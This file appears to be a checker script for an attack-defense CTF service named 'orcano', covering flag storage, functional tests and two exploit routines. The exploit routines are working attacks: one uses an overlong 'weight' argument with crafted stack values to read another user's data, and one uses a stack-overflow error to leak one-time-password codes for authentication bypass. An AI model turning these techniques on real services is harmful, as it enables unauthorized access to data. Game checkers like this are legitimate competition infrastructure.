#!/usr/bin/env python3

from enochecker import BaseChecker, BrokenServiceException, EnoException, run
from enochecker.utils import SimpleSocket, assert_equals, assert_in

import secrets
import re
import struct

from Crypto.Cipher import ChaCha20

def rand_uint(below=2**31):
	return secrets.randbelow(below)
def rand_sint(below=2**31):
	raw = rand_uint(below)
	if rand_bool():
		raw = -raw
	return raw
def rand_bool():
	return secrets.choice([True, False])
def rand_float(total=2**22, denom=2**7, signed=True, force_f32=False):
	# Default: float in [-32768; 32768] with max 7 bits decimal
	raw = secrets.randbelow(total)
	raw /= denom
	if signed and rand_bool():
		raw = -raw
	if force_f32:
		raw = f32(raw)
	return raw
def f32(f):
	# Force to single precision
	val = struct.pack("f", f)
	return struct.unpack("f", val)[0]
def rand_sv():
	# Random stackval
	if rand_bool():
		return rand_sint()
	else:
		return rand_float()
def chunks(l, n):
	for i in range(0, len(l), n):
		yield l[i:i+n]
def secret_shuffle(l):
	for i in range(len(l)):
		j = secrets.randbelow(i + 1)
		t = l[j]
		l[j] = l[i]
		l[i] = t
PROMPT_TEXT = "> "

class OrcanoChecker(BaseChecker):
	flag_variants = 2
	noise_variants = 1
	havoc_variants = 17
	exploit_variants = 2
	service_name = "orcano"
	port = 53273

	# Helpers
	def make_cmd(self, cmd, args = []):
		text = cmd
		for arg in args:
			text += ":"
			if isinstance(arg, int):
				text += "i{}".format(arg)
			elif isinstance(arg, float):
				text += "f{}".format(arg)
			elif isinstance(arg, str):
				text += arg
			else:
				raise EnoException("make_cmd bad arg type {}".format(type(arg)))
		return text
	def make_cmd_rand(self, cmd, args = []):
		# TODO: Use paired randomly
		out_cmds = []
		out_final_args = []
		for arg in args:
			# Figure out type
			if isinstance(arg, int):
				arg_type = "int"
			elif isinstance(arg, float):
				arg_type = "float"
			elif isinstance(arg, str):
				arg_type = "str"
			else:
				raise EnoException("make_cmd_rand bad arg type {}".format(type(arg)))

			# Decide whether to prefix or use inplace
			if arg_type in ["int", "float"] and rand_bool():
				# Prefix
				if arg_type == "int":
					base = secrets.choice(["dec", "hex"])
					if base == "dec":
						out_cmds.append("int:i{}".format(arg))
					elif base == "hex":
						out_cmds.append("int:i{}".format(hex(arg)))
					else:
						assert(False)
				elif arg_type == "float":
					out_cmds.append(self.make_cmd("float", [arg]))
				else:
					assert(False)
				out_final_args.append("s")
			else:
				# Inplace
				out_final_args.append(arg)

		out_cmds.reverse()
		out_cmds.append(self.make_cmd(cmd, out_final_args))
		return out_cmds

	def flag_to_nums(self, flag):
		nums = []
		chunk_len = 3;
		flag_data = flag.encode()
		for ck in chunks(flag_data, chunk_len):
			num = 0
			for i in range(chunk_len):
				num <<= 8
				if i < len(ck):
					num |= ck[i]
			nums.append(num)
		return nums
	def flag_from_nums(self, nums):
		flag_data = bytearray()
		chunk_len = 3
		for n in nums:
			remaining = n
			num_chars = bytearray()
			for i in range(chunk_len):
				d = remaining & 0xff
				remaining >>= 8
				if d == 0:
					continue
				num_chars.append(d)
			flag_data += num_chars[::-1]
			if len(num_chars) != chunk_len:
				break
		return flag_data.decode()

	def gen_uid(self):
		uid0 = rand_sint()
		uid1 = rand_sint()
		return uid0, uid1
	def gen_key(self):
		key0 = rand_sint()
		key1 = rand_sint()
		return key0, key1
	def save_uid(self, uid):
		uid0, uid1 = uid
		return {
			"uid0": uid0,
			"uid1": uid1,
		}
	def save_key(self, key):
		key0, key1 = key
		return {
			"key0": key0,
			"key1": key1,
		}
	def save_otp(self, otp):
		return otp
	def load_uid(self):
		uid0 = self.chain_db["uid0"]
		uid1 = self.chain_db["uid1"]
		return uid0, uid1
	def load_key(self):
		key0 = self.chain_db["key0"]
		key1 = self.chain_db["key1"]
		return key0, key1
	def load_otp(self):
		otp_key = self.chain_db["otp_key"]
		otp_nonce = self.chain_db["otp_nonce"]
		return {
			"otp_key": otp_key,
			"otp_nonce": otp_nonce,
		}
	def uid_to_attack_info(self, uid):
		uid0, uid1 = uid
		return ":i{}:i{}".format(uid0, uid1)
	def uid_from_attack_info(self, attack_info):
		m = re.fullmatch(r":i([-+]?\d+):i([-+]?\d+)", self.attack_info)
		if not m:
			raise BrokenServiceException("bad attack_info")
		uid0 = int(m[1])
		uid1 = int(m[2])
		return uid0, uid1

	def make_user(self, uid, key):
		uid0, uid1 = uid
		key0, key1 = key
		return self.make_cmd("user", [uid0, uid1, key0, key1])
	def make_user_rand(self):
		return self.make_user(self.gen_uid(), self.gen_key())

	def create_user_otp(self, uid):
		cmds = [self.make_cmd("otp_init", [uid[0], uid[1]])]
		result = self.single_request(cmds)
		if not result["ok"]:
			raise BrokenServiceException("otp_init request error")
		if len(result["out"]) != 11:
			raise BrokenServiceException("otp_init bad output")
		output = list(reversed(result["out"]))
		success = output[0]
		if not success:
			raise BrokenServiceException("otp_init error")

		otp_key = b""
		for s in output[1:9]:
			otp_key += struct.pack(">l", s)
		otp_nonce = b""
		for s in output[9:11]:
			otp_nonce += struct.pack(">l", s)
		otp_index = 0

		return {
			"otp_key": otp_key,
			"otp_nonce": otp_nonce,
			"otp_index": otp_index,
		}

	def session_otp_sync(self, conn, uid, otp):
		# Synchronize
		cmds = [self.make_cmd("otp_sync", [uid[0], uid[1]])]
		result = self.make_request(conn, cmds)
		if not result["ok"]:
			raise BrokenServiceException("otp_sync request error")
		if len(result["out"]) != 3:
			raise BrokenServiceException("otp_sync bad output")

		sync_code0 = result["out"][2]
		sync_code1 = result["out"][1]
		sync_index = result["out"][0]

		# Generate next OTP
		gen = ChaCha20.new(key=otp["otp_key"], nonce=otp["otp_nonce"])
		gen.seek(sync_index)
		prev_code0, prev_code1 = struct.unpack_from(">ll", gen.encrypt(b"\x00" * 8), 0x0)

		# Validate previous code
		if sync_code0 != prev_code0 or sync_code1 != prev_code1:
			raise BrokenServiceException("otp_sync bad code")

		otp["index"] = sync_index + 8

	def make_otp_auth(self, uid, otp):
		# Generate next OTP
		gen = ChaCha20.new(key=otp["otp_key"], nonce=otp["otp_nonce"])
		gen.seek(otp["index"])
		next_code0, next_code1 = struct.unpack_from(">ll", gen.encrypt(b"\x00" * 8), 0x0)
		otp["index"] += 8

		return self.make_cmd("otp_auth", [uid[0], uid[1], next_code0, next_code1])

	def begin_conn(self):
		conn = self.connect()
		welcome = conn.read_until(PROMPT_TEXT.encode())
		if not welcome:
			self.debug("read_until welcome remainder: ", conn.read())
			raise BrokenServiceException("read_until welcome timeout")
		self.debug("begin_conn: Got welcome: {}".format(welcome))
		# TODO: Test welcome text
		return conn

	def end_conn(self, conn):
		conn.write("\n")
		conn.close()

	def make_request(self, conn, cmds):
		# TODO: Randomize spacing
		request_text = " ".join(cmds)
		self.debug("make_request: sending {}".format(request_text))
		request_text += "\n"
		conn.write(request_text.encode())

		# Receive response and parse
		response = conn.read_until(PROMPT_TEXT.encode())
		if not response:
			self.debug("read_until request remainder: ", conn.read())
			raise BrokenServiceException("read_until request timeout")
		self.debug("make_request: got {}".format(response))
		lines = response.split(b"\n")
		try:
			lines = [l.decode() for l in lines]
		except UnicodeError:
			raise BrokenServiceException("Invalid characters returned from request")

		# Check prompt line
		if len(lines) <= 1:
			raise BrokenServiceException("Insufficient output returned from request")
		if lines[-1] != PROMPT_TEXT:
			raise BrokenServiceException("Bad prompt returned from request")
		# Trim off prompt
		lines = lines[:-1]

		# Parse output
		output = []
		for l in lines:
			line_prefix_end = l.find(":")
			if line_prefix_end < 0:
				self.debug("make_request: Can't find terminator: {}".format(l))
				raise BrokenServiceException("Invalid output format returned from request")
			line_prefix = l[:line_prefix_end]
			line_suffix = l[line_prefix_end + 1:]
			output.append((line_prefix, line_suffix))

		# Validate output
		if len(output) == 0:
			raise BrokenServiceException("No output returned from request")

		def parse_nums(suffix):
			out_data = []
			if not suffix:
				return []
			for num_text in suffix.strip().split(" "):
				if len(num_text) == 0:
					raise BrokenServiceException("Bad output line spacing")
				
				type_char = num_text[0]
				if type_char == "i":
					try:
						out_data.append(int(num_text[1:]))
					except ValueError:
						self.debug("parse_nums fail int: {}".format(num_text))
						raise BrokenServiceException("Bad output int data")
				elif type_char == "f":
					try:
						# Have to force to F32 here! Otherwise 7 decimal digits
						# is insufficient to distinguish.
						out_data.append(f32(float(num_text[1:])))
					except ValueError:
						self.debug("parse_nums fail float: {}".format(num_text))
						raise BrokenServiceException("Bad output float data")
				else:
					raise BrokenServiceException("Bad output number type")
			return out_data

		# Parse result line
		rl_prefix, rl_suffix = output[-1]
		if rl_prefix == "out":
			# Parse output data
			success = True
			out_data = parse_nums(rl_suffix)
		elif rl_prefix == "error":
			success = False
			err_data = rl_suffix
		else:
			raise BrokenServiceException("Last output line was invalid")

		# Check non-last lines
		mid = []
		for prefix, suffix in output[:-1]:
			if prefix == "inspect":
				mid.append((prefix, parse_nums(suffix)))
			elif prefix == "print":
				mid.append((prefix, suffix[1:]))
			else:
				raise BrokenServiceException("Inner output line was invalid")

		result = {}
		result["ok"] = success
		if success:
			self.debug("make_request: OK - {}".format(out_data))
			result["out"] = out_data
		else:
			self.debug("make_request: ERR - \"{}\"".format(err_data))
			result["err"] = err_data
		result["mid"] = mid

		return result

	def single_request(self, cmds):
		conn = self.begin_conn()
		result = self.make_request(conn, cmds)
		self.end_conn(conn)
		return result

	def single_request_expect(self, cmds, expect_out, expect_mid=[]):
		r = self.single_request(cmds)
		if not r["ok"]:
			raise BrokenServiceException("{}: unexpected error".format(self.action_title))
		if tuple(r["out"]) != tuple(expect_out):
			self.debug("{}: expected {}, got {}".format(self.action_title, tuple(expect_out), tuple(r["out"])))
			raise BrokenServiceException("{}: unexpected result".format(self.action_title))
		if tuple(r["mid"]) != tuple(expect_mid):
			self.debug("{}: expected mid {}, got mid {}".format(self.action_title, tuple(expect_mid), tuple(r["mid"])))
		return r

	def single_request_expect_fail(self, cmds, expect_err=None, expect_mid=None):
		r = self.single_request(cmds)
		if r["ok"]:
			raise BrokenServiceException("{}: unexpected success", self.action_title)
		if expect_err != None and r["err"] != expect_err:
			self.debug("{}: expected {}, got {}".format(self.action_title, expect_err, r["err"]))
			raise BrokenServiceException("{}: unexpected kind of error".format(self.action_title))
		if tuple(r["mid"]) != tuple(expect_mid):
			self.debug("{}: expected mid {}, got mid {}".format(self.action_title, tuple(expect_mid), tuple(r["mid"])))
			raise BrokenServiceException("{}: unexpected output".format(self.action_title))
		return r

	def make_put_data(self, nums):
		cmds = []
		# TODO: We can shuffle these
		cmds += [self.make_cmd("setn", [i, n]) for i, n in enumerate(nums)]
		cmds += [self.make_cmd("lockn", [i]) for i, n in enumerate(nums)]
		return cmds

	def make_get_data(self, count):
		cmds = []
		# TODO: We can shuffle these
		cmds += [self.make_cmd("getn", [i]) for i in reversed(range(count))]
		return cmds

	# Entrypoints
	def putflag(self):
		self.action_title = "putflag"
		if self.variant_id == 0:
			# Encode flag into numbers
			nums = self.flag_to_nums(self.flag)

			uid = self.gen_uid()
			key = self.gen_key()
			db = {}
			db |= self.save_uid(uid)
			db |= self.save_key(key)
			self.chain_db = db

			cmds = []
			cmds += [self.make_user(uid, key)]
			cmds += self.make_put_data(nums)

			conn = self.begin_conn()
			result = self.make_request(conn, cmds)
			self.end_conn(conn)
			if not result["ok"]:
				raise BrokenServiceException("putflag request error")

			return self.uid_to_attack_info(uid)
		elif self.variant_id == 1:
			nums = self.flag_to_nums(self.flag)

			uid = self.gen_uid()
			otp = self.create_user_otp(uid)
			db = {}
			db |= self.save_uid(uid)
			db |= self.save_otp(otp)
			self.chain_db = db

			conn = self.begin_conn()
			self.session_otp_sync(conn, uid, otp)
			cmds = []
			cmds += [self.make_otp_auth(uid, otp)]
			cmds += self.make_put_data(nums)
			result = self.make_request(conn, cmds)
			self.end_conn(conn)
			if not result["ok"]:
				raise BrokenServiceException("putflag request error")

			return self.uid_to_attack_info(uid)
		else:
			raise EnoException("putflag bad variant_id")
	def getflag(self):
		self.action_title = "getflag"
		if self.variant_id == 0:
			try:
				uid = self.load_uid()
				key = self.load_key()
			except:
				raise BrokenServiceException("previous putflag failed")

			expected_nums = self.flag_to_nums(self.flag)

			conn = self.begin_conn()
			cmds = []
			cmds += [self.make_user(uid, key)]
			cmds += [self.make_cmd("del")]
			cmds += self.make_get_data(len(expected_nums))
			result = self.make_request(conn, cmds)
			self.end_conn(conn)
			if not result["ok"]:
				raise BrokenServiceException("getflag request error")

			got_nums = result["out"]
			assert_equals(
				tuple(got_nums),
				tuple(expected_nums),
				message="getflag incorrect flag"
			)
		elif self.variant_id == 1:
			try:
				uid = self.load_uid()
				otp = self.load_otp()
			except:
				raise BrokenServiceException("previous putflag failed")

			expected_nums = self.flag_to_nums(self.flag)

			conn = self.begin_conn()
			self.session_otp_sync(conn, uid, otp)
			cmds = []
			cmds += [self.make_otp_auth(uid, otp)]
			cmds += [self.make_cmd("del")]
			cmds += self.make_get_data(len(expected_nums))
			result = self.make_request(conn, cmds)
			self.end_conn(conn)
			if not result["ok"]:
				raise BrokenServiceException("getflag request error")

			got_nums = result["out"]
			assert_equals(
				tuple(got_nums),
				tuple(expected_nums),
				message="getflag incorrect flag"
			)
		else:
			raise EnoException("getflag bad variant_id")

	def putnoise(self):
		self.action_title = "putnoise"
		if self.variant_id == 0:
			# TODO: Other types of noise.
			nums = [rand_sint() for i in range(1 + secrets.randbelow(20))]

			uid = self.gen_uid()
			key = self.gen_key()
			db = {}
			db |= self.save_uid(uid)
			db |= self.save_key(key)
			db["data"] = nums
			self.chain_db = db

			cmds = []
			cmds += [self.make_user(uid, key)]
			cmds += self.make_put_data(nums)

			conn = self.begin_conn()
			result = self.make_request(conn, cmds)
			self.end_conn(conn)
			if not result["ok"]:
				raise BrokenServiceException("putnoise request error")
		else:
			raise EnoException("putnoise bad variant_id")
	def getnoise(self):
		self.action_title = "getnoise"
		if self.variant_id == 0:
			try:
				uid = self.load_uid()
				key = self.load_key()
				expected_nums = self.chain_db["data"]
			except:
				raise BrokenServiceException("previous putnoise failed")

			conn = self.begin_conn()
			cmds = []
			cmds += [self.make_user(uid, key)]
			cmds += [self.make_cmd("del")]
			cmds += self.make_get_data(len(expected_nums))
			result = self.make_request(conn, cmds)
			self.end_conn(conn)
			if not result["ok"]:
				raise BrokenServiceException("getnoise request error")

			assert_equals(
				tuple(result["out"]),
				tuple(expected_nums),
				message="getnoise incorrect data"
			)
		else:
			raise EnoException("putnoise bad variant_id")

	def havoc(self):
		self.action_title = "havoc"
		if self.variant_id == 0:
			self.action_title = "havoc int"
			val = rand_float()
			cmds = self.make_cmd_rand("int", [val])
			self.single_request_expect(cmds, [int(val)])
		elif self.variant_id == 1:
			self.action_title = "havoc float"
			val = int(rand_float()) # get a float-safe int
			cmds = self.make_cmd_rand("float", [val])
			self.single_request_expect(cmds, [float(val)])
		elif self.variant_id == 2:
			self.action_title = "havoc dup"
			val = rand_sv()
			cmds = self.make_cmd_rand("dup", [val])
			self.single_request_expect(cmds, [val, val])
		elif self.variant_id == 3:
			self.action_title = "havoc rpt"
			val = rand_sv()
			count = secrets.randbelow(32)
			cmds = self.make_cmd_rand("rpt", [count, val])
			self.single_request_expect(cmds, [val] * count)
		elif self.variant_id == 4:
			self.action_title = "havoc del"
			count = secrets.randbelow(32) + 1
			vals = [rand_sv() for i in range(count)]
			cmds = []
			for val in vals:
				cmds += self.make_cmd_rand("stack", [val])
			cmds += self.make_cmd_rand("del")
			self.single_request_expect(cmds, reversed(vals[:-1]))
		elif self.variant_id == 5:
			self.action_title = "havoc drop"
			count = secrets.randbelow(32) + 1
			vals = [rand_sv() for i in range(count)]
			cmds = []
			for val in vals:
				cmds += self.make_cmd_rand("stack", [val])
			count_drop = secrets.randbelow(count)
			cmds += self.make_cmd_rand("drop", [count_drop])
			# Can't use shorthand notation [:-x] here because x can be zero
			self.single_request_expect(cmds, reversed(vals[:len(vals) - count_drop]))
		elif self.variant_id == 6:
			self.action_title = "havoc addi"
			lhs = rand_sint(2 ** 20)
			rhs = rand_sint(2 ** 20)
			cmds = self.make_cmd_rand("addi", [lhs, rhs])
			self.single_request_expect(cmds, [lhs + rhs])
		elif self.variant_id == 7:
			self.action_title = "havoc addf"
			lhs = rand_float()
			rhs = rand_float()
			cmds = self.make_cmd_rand("addf", [lhs, rhs])
			self.single_request_expect(cmds, [f32(lhs + rhs)])
		elif self.variant_id == 8:
			self.action_title = "havoc muli"
			lhs = rand_sint(2 ** 14)
			rhs = rand_sint(2 ** 14)
			cmds = self.make_cmd_rand("muli", [lhs, rhs])
			self.single_request_expect(cmds, [lhs * rhs])
		elif self.variant_id == 9:
			self.action_title = "havoc mulf"
			lhs = rand_float(2 ** 10, 2 ** 5) # todo: accuracy fine here?
			rhs = rand_float(2 ** 10, 2 ** 5)
			cmds = self.make_cmd_rand("mulf", [lhs, rhs])
			self.single_request_expect(cmds, [f32(lhs * rhs)])
		elif self.variant_id == 10:
			self.action_title = "havoc poly"
			# At most quadratic. Some napkin math suggests the FP precision
			# should be sufficient with these values.
			x = rand_float(2 ** 8, 2 ** 2)
			order = rand_uint(3)
			coeffs = [rand_sint(2 ** 4) for i in range(order)]

			y = 0.0
			xp = 1.0
			for c in coeffs:
				y += f32(c * xp)
				y = f32(y)
				xp *= x
				xp = f32(xp)

			cmds = self.make_cmd_rand("poly", [order] + [x] + coeffs)
			self.single_request_expect(cmds, [y])
		elif self.variant_id == 11:
			self.action_title = "havoc weight"
			# TODO
		elif self.variant_id == 12:
			self.action_title = "havoc user"
			uid = self.gen_uid()
			key = self.gen_key()
			key_wrong = (rand_sint(), rand_sint())
			cmds = []
			cmds.append(self.make_user(uid, key))
			cmds.append(self.make_user(uid, key_wrong))
			self.single_request_expect(cmds, [0, 1])
		elif self.variant_id == 13:
			self.action_title = "havoc getn"
			idx = rand_uint()
			cmds = []
			cmds.append(self.make_user_rand())
			cmds.append(self.make_cmd("del"))
			cmds += self.make_cmd_rand("getn", [idx])
			self.single_request_expect(cmds, [0])
		elif self.variant_id == 14:
			self.action_title = "havoc setn"
			idx = rand_uint()
			val = rand_sint()
			cmds = []
			cmds.append(self.make_user_rand())
			cmds.append(self.make_cmd("del"))
			cmds += self.make_cmd_rand("setn", [idx, val])
			cmds += self.make_cmd_rand("getn", [idx])
			self.single_request_expect(cmds, [val])
		elif self.variant_id == 15:
			self.action_title = "havoc lockn"
			idx = rand_uint()
			val = rand_sint()
			new_val = rand_sint()
			cmds = []
			cmds.append(self.make_user_rand())
			cmds.append(self.make_cmd("del"))
			cmds += self.make_cmd_rand("setn", [idx, val])
			cmds += self.make_cmd_rand("getn", [idx])
			cmds += self.make_cmd_rand("lockn", [idx])
			cmds += self.make_cmd_rand("getn", [idx])
			cmds += self.make_cmd_rand("setn", [idx, new_val])
			cmds += self.make_cmd_rand("getn", [idx])
			self.single_request_expect(cmds, [val, val, val])
		elif self.variant_id == 16:
			self.action_title = "havoc inspect"
			count_int = secrets.randbelow(16)
			count_float = secrets.randbelow(16)
			count_remain = secrets.randbelow(4)
			vals_int = [rand_sint() for i in range(count_int)]
			vals_float = [rand_float() for i in range(count_float)]
			vals_remain = [rand_sv() for i in range(count_remain)]
			vals = list(reversed(vals_int + vals_float + vals_remain))

			cmds = []
			for val in vals:
				cmds += self.make_cmd_rand("stack", [val])
			cmds += self.make_cmd_rand("inspect", [count_int, count_float])
			self.single_request_expect(
				cmds,
				vals_remain,
				[vals_int + vals_float]
			)
		else:
			raise EnoException("havoc bad variant_id")

	def exploit(self):
		self.action_title = "exploit"
		if self.variant_id == 0:
			if not self.attack_info:
				raise BrokenServiceException("exploit no attack_info")
			uid0, uid1 = self.uid_from_attack_info(self.attack_info)

			nums = []
			conn = self.begin_conn()
			for i in range(32): # some max for flag len since self.flag isn't accessible
				exploit_cmds = [
					"user",
					"del",
					"weight:" + ("A" * 256),
					"del",
				]
				exploit_cmds += [
					"int:i{}".format(i),
					"int:i{}".format(uid1),
					"int:i{}".format(uid0),
					"int:i0xc",
					"int:i0x47544e51",
					"inspect:i5:pAPsA",
					"getn:i0",
				]

				result = self.make_request(conn, exploit_cmds)
				if not result["ok"]:
					self.debug("Failed to get flag byte {}, err: {}".format(i, result["err"]))
					raise BrokenServiceException("exploit request error")
				if len(result["out"]) != 1 or not isinstance(result["out"][0], int):
					self.debug("Bad response for flag byte {}, out: {}".format(i, result["out"]))
					raise BrokenServiceException("exploit bad response")
				num = result["out"][0]
				if not num:
					break
				nums.append(num)
			self.end_conn(conn)

			got_flag = self.flag_from_nums(nums)
			self.debug("Got flag: {}".format(got_flag))
			if not self.search_flag(got_flag):
				raise BrokenServiceException("exploit no flag")

			return got_flag
		elif self.variant_id == 1:
			if not self.attack_info:
				raise BrokenServiceException("exploit no attack_info")
			uid0, uid1 = self.uid_from_attack_info(self.attack_info)

			# Leak OTP
			conn = self.begin_conn()
			for i in range(2):
				leak_cmds = []
				leak_cmds += [self.make_cmd("rpt", [256 - i, 1337])]
				leak_cmds += [self.make_cmd("otp_sync", [uid0, uid1])]
				leak_result = self.make_request(conn, leak_cmds)
				if leak_result["ok"]:
					raise BrokenServiceException("exploit OTP leak wrong result")
				error = leak_result["err"].strip()
				m = re.fullmatch(r"stack overflow \(i([-+]?\d+)\)", error)
				if not m:
					raise BrokenServiceException("exploit OTP leak wrong error")
				otp_half = int(m[1])
				if i == 0:
					otp0 = otp_half
				else:
					otp1 = otp_half

			# Get data normally using leaked code
			get_cmds = []
			get_cmds += [self.make_cmd("otp_auth", [uid0, uid1, otp0, otp1])]
			get_cmds += self.make_get_data(32) # some max
			get_result = self.make_request(conn, get_cmds)
			self.end_conn(conn)
			if not get_result["ok"]:
				raise BrokenServiceException("exploit get num error")

			nums = get_result["out"]
			got_flag = self.flag_from_nums(nums)
			self.debug("Got flag: {}".format(got_flag))
			if not self.search_flag(got_flag):
				raise BrokenServiceException("exploit no flag")

			return got_flag
		else:
			raise EnoException("exploit bad variant_id")

app = OrcanoChecker.service
if __name__ == "__main__":
	run(OrcanoChecker)